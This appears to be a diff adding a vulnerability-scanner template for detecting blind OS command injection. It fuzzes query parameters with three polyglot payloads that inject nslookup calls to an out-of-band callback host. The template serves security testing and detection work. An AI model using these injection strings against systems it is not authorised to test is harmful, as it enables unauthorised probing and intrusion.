@@ -1,0 +1,40 @@
+id: cmdi-blind-oast-polyglot
+
+info:
+  name: Blind OS Command Injection
+  author: pdteam
+  severity: high
+  tags: cmdi,oast,dast,blind,polyglot
+  description: |
+    OS Commanding is the direct result of mixing trusted code and untrusted data. 
+    This attack is possible when an application accepts untrusted input to build operating system commands in an insecure manner involving improper data sanitization,
+    and/or improper calling of external programs.
+
+variables:
+  marker: "{{interactsh-url}}"
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    
+    stop-at-first-match: true
+    payloads:
+      interaction:
+        # polyglot for command injection from https://portswigger.net/research/hunting-asynchronous-vulnerabilities
+        - "&nslookup {{marker}}&'\\\"`0&nslookup {{marker}}&`'"
+        # polyglot for command injection from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
+        - "1;nslookup${IFS}{{marker}};#${IFS}';nslookup${IFS}{{marker}};#${IFS}\";nslookup${IFS}{{marker}};#${IFS}"
+        - "/*$(nslookup {{marker}})`nslookup {{marker}}``*/-nslookup({{marker}})-'/*$(nslookup {{marker}})`nslookup {{marker}}` #*/-nslookup({{marker}})||'\"||nslookup({{marker}})||\"/*`*/"
+    
+    fuzzing:
+      - part: query
+        fuzz:
+          - "{{interaction}}"
+        type: postfix
+        mode: single
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
